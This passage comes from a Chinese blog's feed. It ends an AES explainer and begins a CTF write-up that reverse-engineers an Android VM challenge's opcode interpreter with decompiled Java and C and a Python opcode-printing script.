(i % <span class="number">8</span> == <span class="number">0</span>)<span class="comment">//如果整除8</span></span><br><span class="line">            temp = <span class="title function_">SubWord</span> (<span class="title function_">RotWord</span> (temp))</span><br><span class="line">                    xor Rcon[i/<span class="number">8</span>];<span class="comment">//对保存的上一个字进行复杂的处理</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(i % <span class="number">8</span> == <span class="number">4</span>)<span class="comment">//如果除8余4</span></span><br><span class="line">            temp = <span class="title function_">SubWord</span> (temp);</span><br><span class="line">        w[i] = w[i<span class="number">-8</span>] xor temp;<span class="comment">/*将上一个字（处理或没处理过）</span></span><br><span class="line"><span class="comment">                               与6个字之前的字进行异或，得到当前的字*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此段摘自zhuanlan.zhihu.com&#x2F;p&#x2F;360393988</p></blockquote><h3 id="总过程"><a href="#总过程" class="headerlink" title="总过程"></a>总过程</h3><p>加密时，执行：</p><ul><li>轮密钥加</li><li>（字节替代+行位移+列混淆+轮密钥加）*9</li><li>字节替代+行位移+轮密钥加</li></ul><p>以上过程是对于16字节密钥的</p>]]></content>
    
    
    <summary type="html">AES的算法解释</summary>
    
    
    
    <category term="密码学" scheme="https://www.pri87.vip/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="密码" scheme="https://www.pri87.vip/tags/%E5%AF%86%E7%A0%81/"/>
    
    <category term="加密方法" scheme="https://www.pri87.vip/tags/%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/"/>
    
    <category term="对称加密" scheme="https://www.pri87.vip/tags/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/"/>
    
    <category term="流加密" scheme="https://www.pri87.vip/tags/%E6%B5%81%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>CTF-VM(2)</title>
    <link href="https://www.pri87.vip/posts/b22e135.html"/>
    <id>https://www.pri87.vip/posts/b22e135.html</id>
    <published>2024-03-08T18:18:12.000Z</published>
    <updated>2024-03-09T04:08:47.149Z</updated>
    
    <content type="html"><![CDATA[<p>尝试对虚拟机保护有更深的理解。</p><p>由于之前做vm题感觉完全不会，所以找了几道题试一试</p><p>由之前的vm简要介绍看到vm题总是给出opcode的运行方式，然后通过opcode还原出运行逻辑，最后求出flag</p><h2 id="EzADVM"><a href="#EzADVM" class="headerlink" title="EzADVM"></a>EzADVM</h2><p>这个是个安卓vm，jadx打开，然后打开main_activity,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">CheckClick</span><span class="params">(View a)</span> &#123;</span><br><span class="line">        <span class="type">TextView</span> <span class="variable">tv</span> <span class="operator">=</span> <span class="built_in">this</span>.binding.sampleText;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">flagText</span> <span class="operator">=</span> <span class="built_in">this</span>.binding.flagtext;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flagstring</span> <span class="operator">=</span> flagText.getText().toString();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;Right!&quot;</span>.equals(stringFromJNI(flagstring))) &#123;</span><br><span class="line">            tv.setText(<span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">            tv.setTextColor(-<span class="number">16711936</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>看到有stringFromJNI(flagstring)，去找函数原型，没找到，应该在库里。</p><p>用apktool反编译出源代码。打开so文件</p><p>重点是这些：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">now_num = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">1</span>;</span><br><span class="line">  used_char = _JNIEnv::GetStringUTFChars(in, a3, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !i++ )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_29:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;decltype(nullptr)&gt;(v14, <span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">        v7 = (<span class="type">const</span> <span class="type">char</span> *)sub_20F50(v14);</span><br><span class="line">        v13 = _JNIEnv::NewStringUTF(in, v7);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v14);</span><br><span class="line">        <span class="keyword">return</span> v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( code[i] != <span class="number">0x21</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      __strcpy_chk(input, used_char, <span class="number">1024LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( code[i] == <span class="number">0xFF</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">    <span class="keyword">if</span> ( code[i] == <span class="number">0x88</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( code[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xA1</span>u:</span><br><span class="line">        s[now_num - <span class="number">1</span>] = or_not_num &amp; or_num;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xC3</span>u:</span><br><span class="line">        or_num = b1 | b2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xB2</span>u:</span><br><span class="line">        not_1 = ~b1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xE5</span>u:</span><br><span class="line">        not_2 = ~b2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xF1</span>u:</span><br><span class="line">        b1 = input[now_num];</span><br><span class="line">        b2 = input[++now_num];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xD4</span>u:</span><br><span class="line">        or_not_num = not_2 | not_1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xBF</span>u:</span><br><span class="line">        i_form = now_num++;</span><br><span class="line">        save[<span class="number">0</span>] = s[i_form];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x99</span>u:</span><br><span class="line">        now_num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xBB</span>u:</span><br><span class="line">        s[now_num - <span class="number">1</span>] = now_num + save[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;last, s, <span class="number">0x20</span>uLL) )</span><br></pre></td></tr></table></figure><p>输入用来初始化input了，所以相当于是用指令码对input加密，最后得到last</p><p>以及一开始有一个循环只有当code[i]&#x3D;&#x3D;0先1时才会执行初始化，所以只需要匹配合理的指令即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">opcode = [<span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, </span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, </span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, </span><br><span class="line">        <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, </span><br><span class="line">        <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, </span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, </span><br><span class="line">        <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, </span><br><span class="line">        <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x99</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, </span><br><span class="line">        <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x99</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x53</span>, </span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x88</span>, <span class="number">0xFF</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> opcode:</span><br><span class="line">    <span class="keyword">match</span> code:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xa1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;last[now_num - 1] = or_not_num &amp; or_num&quot;</span> )</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;or_num = b1 | b2&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xb2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not_1 = ~b1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not_2 = ~b2&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xf1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;b1 = input[now_num]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num += 1&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;b2 = input[now_num]&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xd4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;or_not_num = not_2 | not_1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xbf</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;save = last[now_num]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num+=1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x99</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num = 0&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xbb</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;last[now_num-1] = now_num + save - 1&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大致是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 